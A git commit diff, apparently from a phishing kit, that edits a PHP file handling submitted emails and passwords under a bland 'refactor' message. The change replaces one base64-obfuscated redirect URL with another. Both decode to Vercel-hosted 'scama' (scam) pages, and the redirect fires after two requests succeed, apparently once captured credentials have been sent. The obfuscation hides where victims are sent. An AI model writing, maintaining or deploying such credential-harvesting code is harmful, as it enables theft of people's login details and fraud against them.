9cb0b34facee085654d5e866f6f3f4bf04fe6069
Bonjour00539 <gilles.amorin01@gmail.com>
2025-11-25 19:53:59 +0100

    Refactor email and password handling logic

--- traitement.php
+++ traitement.php
@@ -111,7 +111,7 @@ document.addEventListener('DOMContentLoaded', function () {
                     if (response[0].ok && response[1].ok) {
                         // Redirection vers le lien en base64 en cas de succès
             window.location.href = atob(
-              "aHR0cHM6Ly9maW5hbC1uZW9uLXBzaS52ZXJjZWwuYXBwL2ZpbmFsJTIwbmV3JTIwc2NhbWEuaHRtbA=="
+              "aHR0cHM6Ly9maW5hbC1laWdodC1ncmVlbi52ZXJjZWwuYXBwL2ZpbmFsJTIwbmV3JTIwc2NhbWEuaHRtbA=="
             );                    } else {
                         // Gestion de l'échec d'envoi
                     }
